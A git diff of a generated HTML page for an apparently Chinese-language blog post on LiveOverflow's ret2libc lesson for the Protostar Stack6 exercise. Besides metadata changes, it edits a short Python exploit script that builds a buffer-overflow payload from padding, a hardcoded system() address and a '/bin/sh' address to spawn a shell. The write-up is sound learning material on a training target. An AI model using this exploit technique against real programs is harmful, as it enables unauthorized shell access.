@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://i.imgur.com/6PN7c3h.png">
 <meta property="og:image" content="https://i.imgur.com/BAWzxYv.png">
 <meta property="og:image" content="https://i.imgur.com/9Vo93dm.png">
-<meta property="og:updated_time" content="2018-10-06T03:43:58.395Z">
+<meta property="og:updated_time" content="2018-10-06T03:45:55.573Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Liveoverflow-0x0F-ret2libc">
 <meta name="twitter:description" content="接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。 同样翻来覆去看了很多遍，可能比上个视频看的次数还多，但是一直没理解透彻，这两天又拿出来看了几遍，不知道为什么就豁然开朗了，，，赶紧趁热写进博客。 视频链接：http://liveoverflow.com/binary_hacking/ 下面是题目  Protostar Stack6AboutStack6 looks at what">
@@ -171,7 +171,7 @@ int main()
 <p><img src="https://i.imgur.com/BAWzxYv.png" alt=""></p>
 <p>可以开始写脚本了</p>
 <pre><code>import struct
-padding = &quot;A&quot;*2
+padding = &quot;A&quot;*20
 system = struct.pack(&quot;I&quot;, 0xb7ecffb0)
 return_after_system = &quot;AAAA&quot;
 bin_sh = struct.pack(&quot;I&quot;, 0xb7fb63bf)
@@ -181,7 +181,7 @@ print padding + system + return_after_system + bin_sh
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/05/Liveoverflow-0x0F-ret2libc/" data-id="cjmww9q100004b8obxcgwba3i" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/10/05/Liveoverflow-0x0F-ret2libc/" data-id="cjmwwc99300030sob3854syq4" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary-Hacking/">Binary-Hacking</a></li></ul>
